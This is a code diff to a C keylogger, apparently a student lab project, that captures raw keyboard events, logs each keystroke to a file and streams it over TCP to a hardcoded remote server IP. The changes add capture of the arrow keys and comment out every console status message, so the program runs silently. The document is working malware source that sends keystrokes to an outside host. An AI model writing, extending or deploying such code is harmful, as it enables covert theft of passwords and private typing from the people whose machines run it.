@@ -13,7 +13,7 @@
 #define PORT 8080
 // Server address will depend on your VM
 // #define ADDRESS "10.0.2.15" // Uwem's server VM
-#define ADDRESS "192.168.56.101" //Alvin's Server VM
+#define ADDRESS "192.168.56.102" //Alvin's Server VM
 #define SA struct sockaddr
 
 char *keys = "__1234567890-=__qwertyuiop[]__asdfghjkl;'___zxcvbnm,./";
@@ -72,6 +72,22 @@ void keylogger(int log_file, int sockfd) {
                     write(log_file, "[SHIFT]", strlen("[SHIFT]"));
         write(sockfd, "[SHIFT]", strlen("[SHIFT]"));
         break;
+                case 103:
+                    write(log_file, "[UP]", strlen("[UP]"));
+        write(sockfd, "[UP]", strlen("[UP]"));
+        break;
+                case 105:
+                    write(log_file, "[LEFT]", strlen("[LEFT]"));
+        write(sockfd, "[LEFT]", strlen("[LEFT]"));
+        break;
+                case 106:
+                    write(log_file, "[RIGHT]", strlen("[RIGHT]"));
+        write(sockfd, "[RIGHT]", strlen("[RIGHT]"));
+        break;
+                case 108:
+                    write(log_file, "[DOWN]", strlen("[DOWN]"));
+        write(sockfd, "[DOWN]", strlen("[DOWN]"));
+        break;
                 default:
                   if(event.code <= 53){
                     write(log_file, &keys[event.code], sizeof(char));
@@ -91,7 +107,7 @@ void keylogger(int log_file, int sockfd) {
     }
 }
 
-int main() {
+int main(int argc, char* argv[]) {
     int fd = open("log.txt", O_CREAT | O_TRUNC | O_RDWR);
 
     //TCP Client based on https://www.geeksforgeeks.org/tcp-server-client-implementation-in-c/
@@ -101,11 +117,11 @@ int main() {
     // socket create and varification
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd == -1) {
-        printf("socket creation failed...\n");
+        // printf("socket creation failed...\n");
         exit(0);
     }
     else
-        printf("Socket successfully created..\n");
+        // printf("Socket successfully created..\n");
     bzero(&servaddr, sizeof(servaddr));
 
     // assign IP, PORT
@@ -115,11 +131,11 @@ int main() {
 
     // connect the client socket to server socket
     if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) {
-        printf("connection with the server failed...\n");
+        // printf("connection with the server failed...\n");
         exit(0);
     }
     else
-        printf("connected to the server..\n");
+        // printf("connected to the server..\n");
 
     while(1)
     keylogger(fd,sockfd);
